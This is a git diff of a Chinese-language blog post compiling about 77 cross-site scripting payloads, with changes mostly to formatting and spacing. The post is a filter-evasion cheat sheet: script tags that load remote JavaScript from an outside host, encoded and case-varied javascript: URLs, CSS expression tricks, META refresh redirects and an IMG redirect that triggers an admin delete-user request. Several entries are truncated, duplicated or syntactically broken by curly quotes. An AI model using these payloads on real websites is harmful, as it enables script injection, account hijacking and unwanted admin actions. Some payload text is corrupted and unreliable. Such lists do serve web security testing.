@@ -2,13 +2,11 @@
 layout: post
 title: XSS 攻击汇总
 date: '2018-12-12 06:07:00'
-tags:
-- xss
-- pentest
-- hash-import-2023-03-22-16-36
+categories: ["security", "web"]
+tags: ["xss", "pentest"]
 ---
 
-### via:NightRaid
+> via:NightRaid
 
 * * *
 
@@ -16,57 +14,57 @@ tags:
 
 > [Ajax hacking with XSS](http://www.91ri.org/3949.html)
 
-> [用xss平台沦陷百度投诉中心后台](http://www.91ri.org/3839.html)
+> [用 xss 平台沦陷百度投诉中心后台](http://www.91ri.org/3839.html)
 
-> [跨站脚本(Xss)-新手指南](http://www.nxadmin.com/web/1017.html)
+> [跨站脚本 (Xss)-新手指南](http://www.nxadmin.com/web/1017.html)
 
-> [HTML5下的XSS测试代码](http://www.nxadmin.com/penetration/1173.html)
+> [HTML5 下的 XSS 测试代码](http://www.nxadmin.com/penetration/1173.html)
 
-(1) 普通的XSS JavaScript注入
-
-    <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
-
-(2) IMG标签XSS使用JavaScript命令
+(1) 普通的 XSS JavaScript 注入
 
     <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
 
-(3) IMG标签无分号无引号
+(2) IMG 标签 XSS 使用 JavaScript 命令
+
+    <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
+
+(3) IMG 标签无分号无引号
 
     <IMG SRC=javascript:alert(‘XSS’)>
 
-(4) IMG标签大小写不敏感
+(4) IMG 标签大小写不敏感
 
     <IMG SRC=JaVaScRiPt:alert(‘XSS’)>
 
-(5) HTML编码(必须有分号)
+(5) HTML 编码 (必须有分号)
 
     <IMG SRC=javascript:alert(“XSS”)>
 
-(6) 修正缺陷IMG标签
+(6) 修正缺陷 IMG 标签
 
     <IMG “”"><SCRIPT>alert(“XSS”)</SCRIPT>”>
 
-(7) formCharCode标签(计算器)
+(7) formCharCode 标签 (计算器)
 
     <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 
-(8) UTF-8的Unicode编码(计算器)
+(8) UTF-8 的 Unicode 编码 (计算器)
 
     <IMG SRC=jav..省略..S')>
 
-(9) 7位的UTF-8的Unicode编码是没有分号的(计算器)
+(9) 7 位的 UTF-8 的 Unicode 编码是没有分号的 (计算器)
 
     <IMG SRC=jav..省略..S')>
 
-(10) 十六进制编码也是没有分号(计算器)
+(10) 十六进制编码也是没有分号 (计算器)
 
     <IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>
 
-(11) 嵌入式标签,将Javascript分开
+(11) 嵌入式标签，将 Javascript 分开
 
     <IMG SRC=”jav ascript:alert(‘XSS’);”>
 
-(12) 嵌入式编码标签,将Javascript分开
+(12) 嵌入式编码标签，将 Javascript 分开
 
     <IMG SRC=”jav ascript:alert(‘XSS’);”>
 
@@ -78,11 +76,11 @@ tags:
 
     <IMG SRC=”jav ascript:alert(‘XSS’);”>
 
-(15) 嵌入式多行注入JavaScript,这是XSS极端的例子
+(15) 嵌入式多行注入 JavaScript，这是 XSS 极端的例子
 
     <IMG SRC=”javascript:alert(‘XSS‘)”>
 
-(16) 解决限制字符(要求同页面)
+(16) 解决限制字符 (要求同页面)
 
     <script>z=’document.’</script>
     <script>z=z+’write(“‘</script>
@@ -99,11 +97,11 @@ tags:
 
     perl -e ‘print “<IMG SRC=java\0script:alert(\”XSS\”)>”;’ > out
 
-(18) 空字符2,空字符在国内基本没效果.因为没有地方可以利用
+(18) 空字符 2，空字符在国内基本没效果。因为没有地方可以利用
 
     perl -e ‘print “<SCR\0IPT>alert(\”XSS\”)</SCR\0IPT>”;’ > out
 
-(19) Spaces和meta前的IMG标签
+(19) Spaces 和 meta 前的 IMG 标签
 
     <IMG SRC=” javascript:alert(‘XSS’);”>
 
@@ -123,15 +121,15 @@ tags:
 
     <<SCRIPT>alert(“XSS”);//<</SCRIPT>
 
-(24) 无结束脚本标记(仅火狐等浏览器)
+(24) 无结束脚本标记 (仅火狐等浏览器)
 
     <SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
 
-(25) 无结束脚本标记2
+(25) 无结束脚本标记 2
 
     <SCRIPT SRC=//3w.org/XSS/xss.js>
 
-(26) 半开的HTML/JavaScript XSS
+(26) 半开的 HTML/JavaScript XSS
 
     <IMG SRC=”javascript:alert(‘XSS’)”
 
@@ -144,11 +142,11 @@ tags:
     <SCRIPT>a=/XSS/
     alert(a.source)</SCRIPT>
 
-(29) 换码过滤的JavaScript
+(29) 换码过滤的 JavaScript
 
     \”;alert(‘XSS’);//
 
-(30) 结束Title标签
+(30) 结束 Title 标签
 
     </TITLE><SCRIPT>alert(“XSS”);</SCRIPT>
 
@@ -160,7 +158,7 @@ tags:
 
     <BODY BACKGROUND=”javascript:alert(‘XSS’)”>
 
-(33) BODY标签
+(33) BODY 标签
 
     <BODY(‘XSS’)>
 
@@ -192,7 +190,7 @@ tags:
 
     <IMG SRC=’vbscript:msgbox(“XSS”)’></STYLE><UL><LI>XSS
 
-(41) META链接url
+(41) META 链接 url
 
     <META HTTP-EQUIV=”refresh” CONTENT=”0;
     URL=http://;URL=javascript:alert(‘XSS’);”>
@@ -217,7 +215,7 @@ tags:
 
     <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
 
-(47) DIV background-image后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)
+(47) DIV background-image 后加上额外字符 (1-32&34&39&160&8192-8&13&12288&65279)
 
     <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
 
@@ -225,11 +223,11 @@ tags:
 
     <DIV STYLE=”width: expression_r(alert(‘XSS’));”>
 
-(49) STYLE属性分拆表达
+(49) STYLE 属性分拆表达
 
     <IMG STYLE=”xss:expression_r(alert(‘XSS’))”>
 
-(50) 匿名STYLE(组成:开角号和一个字母开头)
+(50) 匿名 STYLE(组成：开角号和一个字母开头)
 
     <XSS STYLE=”xss:expression_r(alert(‘XSS’))”>
 
@@ -238,7 +236,7 @@ tags:
     <STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</STYLE><A
     CLASS=XSS></A>
 
-(52) IMG STYLE方式
+(52) IMG STYLE 方式
 
     exppression(alert(“XSS”))’>
 
@@ -251,11 +249,11 @@ tags:
 
     <BASE HREF=”javascript:alert(‘XSS’);//”>
 
-(55) EMBED标签,你可以嵌入FLASH,其中包涵XSS
+(55) EMBED 标签，你可以嵌入 FLASH，其中包涵 XSS
 
     <EMBED SRC=”http://3w.org/XSS/xss.swf” ></EMBED>
 
-(56) 在flash中使用ActionScrpt可以混进你XSS的代码
+(56) 在 flash 中使用 ActionScrpt 可以混进你 XSS 的代码
 
     a=”get”;
     b=”URL(\”";
@@ -263,22 +261,22 @@ tags:
     d=”alert(‘XSS’);\”)”;
     eval_r(a+b+c+d);
 
-(57) XML namespace.HTC文件必须和你的XSS载体在一台服务器上
+(57) XML namespace.HTC 文件必须和你的 XSS 载体在一台服务器上
 
     <HTML xmlns:xss>
     <?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”>
     <xss:xss>XSS</xss:xss>
     </HTML>
 
-(58) 如果过滤了你的JS你可以在图片里添加JS代码来利用
+(58) 如果过滤了你的 JS 你可以在图片里添加 JS 代码来利用
 
     <SCRIPT SRC=””></SCRIPT>
 
-(59) IMG嵌入式命令,可执行任意命令
+(59) IMG 嵌入式命令，可执行任意命令
 
     <IMG SRC=”http://www.XXX.com/a.php?a=b”>
 
-(60) IMG嵌入式命令(a.jpg在同服务器)
+(60) IMG 嵌入式命令 (a.jpg 在同服务器)
 
     Redirect 302 /a.jpg http://www.XXX.com/admin.asp&deleteuser
 
@@ -311,23 +309,23 @@ tags:
     <SCRIPT>document.write(“<SCRI”);</SCRIPT>PT SRC=”http://3w.org/xss.js”>
     </SCRIPT>
 
-(68) URL绕行
+(68) URL 绕行
 
     <A HREF=”http://127.0.0.1/”>XSS</A>
 
-(69) URL编码
+(69) URL 编码
 
     <A HREF=”http://3w.org”>XSS</A>
 
-(70) IP十进制
+(70) IP 十进制
 
     <A HREF=”http://3232235521″>XSS</A>
 
-(71) IP十六进制
+(71) IP 十六进制
 
     <A HREF=”http://0xc0.0xa8.0×00.0×01″>XSS</A>
 
-(72) IP八进制
+(72) IP 八进制
 
     <A HREF=”http://0300.0250.0000.0001″>XSS</A>
 
@@ -344,11 +342,10 @@ tags:
 
     <A HREF=”http://yunsec.net/”>XSS</A>
 
-(76) 绝对点绝对DNS
+(76) 绝对点绝对 DNS
 
     <A HREF=”http://3w.org./”>XSS</A>
 
-(77) javascript链接
+(77) javascript 链接
 
     <A HREF=”javascript:document.location=’http://3w.org/’”>XSS</A>
-
